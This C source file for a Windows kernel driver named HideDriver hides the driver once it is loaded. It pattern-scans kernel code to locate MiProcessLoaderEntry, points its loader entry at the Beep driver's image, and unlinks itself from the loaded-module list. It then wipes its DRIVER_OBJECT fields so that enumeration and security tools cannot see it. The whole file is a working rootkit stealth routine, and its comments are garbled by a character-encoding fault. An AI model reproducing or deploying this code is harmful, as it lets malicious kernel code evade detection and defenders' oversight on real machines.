#include "HideDriver.h"

//��ȡWin10ϵͳ��MiProcessLoaderEntry������ַ
MiProcessLoaderEntry GetMiProcessLoaderEntryAddress_Win10()
{
	//���ҷ�ʽ
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry

	//������
	CHAR MmUnloadSystemImage_Code[] = "\x83\xCA\xFF"				//or        edx, 0FFFFFFFFh
		"\x48\x8B\xCF"																			//mov     rcx, rdi
		"\x48\x8B\xD8"																			//mov     rbx, rax
		"\xE8";																							//call       *******

	//��ȡMmUnloadSystemImage������ַ,��Ϊ�����Ŀ�ʼ��ַ
	ULONG_PTR MmUnloadSystemImageAddress = 0;
	{
		UNICODE_STRING FuncName;
		RtlInitUnicodeString(&FuncName, L"MmUnloadSystemImage");
		MmUnloadSystemImageAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&FuncName);
		if (MmUnloadSystemImageAddress == 0)
		{
			printfs("[Hide] : ����MmUnloadSystemImage������ַʧ��");
			return NULL;
		}
	}

	//���������Ŀ�ʼλ�úͽ���λ��
	ULONG_PTR StartAddress = MmUnloadSystemImageAddress;
	ULONG_PTR StopAddress = MmUnloadSystemImageAddress + 0x500;

	ULONG_PTR MiUnloadSystemImageAddress = 0;

	//��ʼ����MiUnloadSystemImage�ĵ�ַ
	while (StartAddress < StopAddress)
	{
		if (memcmp((VOID*)StartAddress, MmUnloadSystemImage_Code, strlen(MmUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmUnloadSystemImage_Code);
			MiUnloadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	if (MiUnloadSystemImageAddress == 0)
	{
		printfs("[Hide] : ����MiUnloadSystemImage������ַʧ��");
		return NULL;
	}

	//�ٴ����������Ŀ�ʼλ�úͽ���λ��
	StartAddress = MiUnloadSystemImageAddress;
	StopAddress = MiUnloadSystemImageAddress + 0x600;

	MiProcessLoaderEntry f_MiProcessLoaderEntry = 0;

	//��ʼ����MiProcessLoaderEntry������ַ
	while (StartAddress < StopAddress)
	{
		if (*(UCHAR*)StartAddress == 0xE8 &&												//call
			*(UCHAR *)(StartAddress + 5) == 0x8B && *(UCHAR *)(StartAddress + 6) == 0x05)	//mov eax,
		{
			StartAddress++;	//����call��0xE8
			f_MiProcessLoaderEntry = (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
			break;
		}
		++StartAddress;
	}

	return f_MiProcessLoaderEntry;
}

//��ȡMiProcessLoaderEntry������ַ
MiProcessLoaderEntry GetMiProcessLoaderEntryAddress()
{
	//������ַ
	MiProcessLoaderEntry f_MiProcessLoaderEntry = NULL;

	//����״̬
	NTSTATUS Status = STATUS_SUCCESS;

	//��ȡ��ǰϵͳ�汾
	RTL_OSVERSIONINFOEXW Version;
	RtlZeroMemory(&Version, sizeof(Version));
	Version.dwOSVersionInfoSize = sizeof(Version);
	Status = RtlGetVersion(&Version);
	if (!NT_SUCCESS(Status))
	{
		printfs("[Hide] : ��ȡϵͳ�汾ʧ��");
		return f_MiProcessLoaderEntry;
	}

	if (Version.dwMajorVersion == 10)
	{
		printfs("[Hide] : Win10ϵͳ");
		f_MiProcessLoaderEntry = GetMiProcessLoaderEntryAddress_Win10();
	}
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3)
	{
		printfs("[Hide] : Win8.1ϵͳ");
	}
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 2 && Version.wProductType == VER_NT_WORKSTATION)
	{
		printfs("[Hide] : Win8ϵͳ");
	}
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 1 && Version.wProductType == VER_NT_WORKSTATION)
	{
		printfs("[Hide] : Win7ϵͳ");
	}
	else printfs("[Hide] : δ֪ϵͳ");

	return f_MiProcessLoaderEntry;
}

//���³�ʼ������
VOID Reinitialize(PDRIVER_OBJECT DriverObject, PVOID Context, ULONG Count)
{
	//Ϊ����
	UNREFERENCED_PARAMETER(Context);
	UNREFERENCED_PARAMETER(Count);

	//�Ȼ�ȡMiProcessLoaderEntry�����ĵ�ַ
	MiProcessLoaderEntry f_MiProcessLoaderEntry = GetMiProcessLoaderEntryAddress();
	if (f_MiProcessLoaderEntry == 0)
	{
		printfs("[Hide] : MiProcessLoaderEntry������ַ��ȡʧ��");
		return;
	}
	printfs("[Hide] : MiProcessLoaderEntry ->  %8x", f_MiProcessLoaderEntry);

	//��Ϊ������������ժ��֮��Ͳ���֧��SEH��
	//������SEH�ַ��Ǹ��ݴ������ϻ�ȡ������ַ���ж��쳣�ĵ�ַ�Ƿ��ڸ�������
	//��Ϊ������û�ˣ��ͻ������
	//ѧϰ����Ϯ�����ķ������ñ��˵�����������������ϵĵ�ַ
	{
		//��ȡBeep�豸
		PDRIVER_OBJECT BeepObject = NULL;
		UNICODE_STRING FuncName;
		RtlInitUnicodeString(&FuncName, L"\\Driver\\beep");
		NTSTATUS Status = ObReferenceObjectByName(&FuncName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &BeepObject);
		if (!NT_SUCCESS(Status))
		{
			printfs("[Hide] : ��ȡBeep��������ʧ��");
			return;
		}

		//�����滻
		PLDR_DATA_TABLE_ENTRY LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
		LdrEntry->DllBase = BeepObject->DriverStart;

		ObDereferenceObject(BeepObject);
	}

	//�����Լ�
	f_MiProcessLoaderEntry(DriverObject->DriverSection, 0);

	//�������
	{
		PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
		InitializeListHead(&ldr->InLoadOrderLinks);
		InitializeListHead(&ldr->InMemoryOrderLinks);
	}

	//�ƻ�����
	DriverObject->DriverSection = NULL;
	DriverObject->DriverStart = NULL;
	DriverObject->DriverSize = 0;
	DriverObject->DriverUnload = NULL;
	DriverObject->DriverInit = NULL;
	DriverObject->DeviceObject = NULL;

	printfs("[Hide] : �������سɹ�");
}

//�������
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegString)
{
	//δ����
	UNREFERENCED_PARAMETER(RegString);

	//���³�ʼ��
	IoRegisterDriverReinitialization(DriverObject, Reinitialize, NULL);

	printfs("[Hide] : �������سɹ�");
	return STATUS_SUCCESS;
}